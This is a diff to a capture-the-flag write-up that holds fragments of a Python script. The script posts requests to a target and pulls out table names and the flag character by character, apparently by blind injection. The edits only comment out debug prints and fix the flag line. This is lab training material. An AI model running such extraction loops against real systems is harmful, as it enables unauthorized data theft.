@@ -112,8 +112,8 @@ for j in range(1,len(string.printable)):
 		x = requests.post(url, data=p)
 		if returned_text in x.text :
 			step += 1
-			print(x.text)
-			print(i)
+			#print(x.text)
+			#print(i)
 			table = table + i
 			print("found more char : ", table)
 
@@ -154,8 +154,8 @@ for j in range(1,len(string.printable)):
 		x = requests.post(url, data=p)
 		if returned_text in x.text :
 			step += 1
-			print(x.text)
-			print(i)
+			#print(x.text)
+			#print(i)
 			flag = flag + i
 			print("found more char : ", flag)
 
@@ -163,7 +163,7 @@ print("FLAG : " flag)
 ```
 
 ```
-AND finnaly i have got FLAG The : EGCERT{flaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag}
+AND finnaly i have got FLAG : EGCERT{flaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag}
 ```
 
 #### Linkedin : [https://www.linkedin.com/in/maboelnour12/](https://www.linkedin.com/in/maboelnour12/)
